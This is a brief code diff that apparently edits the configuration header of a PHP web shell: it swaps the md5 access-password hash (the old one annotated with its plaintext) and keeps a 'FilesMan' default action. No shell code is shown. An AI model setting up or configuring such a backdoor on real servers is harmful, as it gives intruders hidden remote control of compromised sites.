@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "6a684f2c9a41df2c963a1ee7d17ce2a0"; //mrmad
+$password = "3cf21bf2704b71db7e190ebaae729bbe"; //
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
